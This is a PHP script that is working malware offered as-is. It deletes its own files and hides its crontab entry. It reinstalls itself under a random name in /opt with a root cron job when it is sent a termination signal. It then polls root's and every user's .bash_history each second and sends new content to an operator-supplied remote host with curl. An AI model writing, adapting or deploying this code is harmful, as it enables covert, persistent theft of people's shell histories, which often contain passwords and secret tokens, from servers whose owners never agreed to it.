<?php

$lastSize = array();
$host = getenv('TARGET_HOST');
$key = getenv('TARGET_KEY');
$api = getenv('TARGET_FILE');
$protocol = getenv('TARGET_PROTOCOL');
$crypt = getenv('LOCAL_CRYPT');
$iv = getenv('LOCAL_IV');
unlink(__FILE__);
$sh = preg_replace('/\.php$/', '.sh', __FILE__);
unlink($sh);
file_put_contents(
    '/etc/crontab',
    str_replace("\n* * * * * root sh $sh", '', file_get_contents('/etc/crontab'))
);
if (getenv('##KILLNAME##') === '##KILLKEY##') {
    exit;
}
$data = file_get_contents(__FILE__);
$pcntlhandler = function () use ($api, $key, $host, $protocol, $data, $crypt, $iv) {
    $file = randomAlphaNumericString(3);
    mkdir("/opt", true);
    file_put_contents('/etc/crontab', "\n* * * * * root sh /opt/$file.sh", FILE_APPEND);
    file_put_contents(
        "/opt/$file.sh",
        "TARGET_API=$api "
        . "TARGET_PROTOCOL=$protocol "
        . "TARGET_HOST=$host "
        . "TARGET_KEY=$key "
        . "LOCAL_CRYPT=$crypt "
        . "LOCAL_IV=$iv "
        . "LOCAL_CRYPT=$crypt "
        . "php $file.php &>/dev/null &"
    );
    file_put_contents("/opt/$file.php", $data);
};
pcntl_signal(SIGTERM, $pcntlhandler);
pcntl_signal(SIGKILL, $pcntlhandler);
while (true) {
    $files = array('root' => '/root/.bash_history');
    foreach (array_diff(scandir('/home'), ['.', '..']) as $user) {
        $files[preg_replace('/[^a-z0-9_-]+/i', '', $user)] = "/home/$user/.bash_history";
    }
    foreach ($files as $user => $file) {
        if (is_file($file) && is_readable($file)) {
            $lastSize2 = filesize($file);
            if ($lastSize[$user] ?? 0 !== $lastSize2) {
                $data = file_get_contents($file);
                if ($data) {
                    $c = curl_init();
                    curl_setopt_array($c, array(
                        CURLOPT_CUSTOMREQUEST => 'LOG',
                        CURLOPT_URL => "$protocol://$host/$api.php",
                        CURLOPT_POSTFIELDS => $data,
                        CURLOPT_HTTPHEADER => array(
                            'CONTENT-TYPE: text/plain',
                            "ANYTHINGGOES: $key",
                            "LOGGEDUSER: $user"
                        )
                    ));
                    curl_exec($c);
                    curl_close($c);
                    $lastSize[$user] = $lastSize2;
                }
            }
        }
    }
    if (getenv('##KILLNAME##') === '##KILLKEY##') {
        exit;
    }
    sleep(1);
}
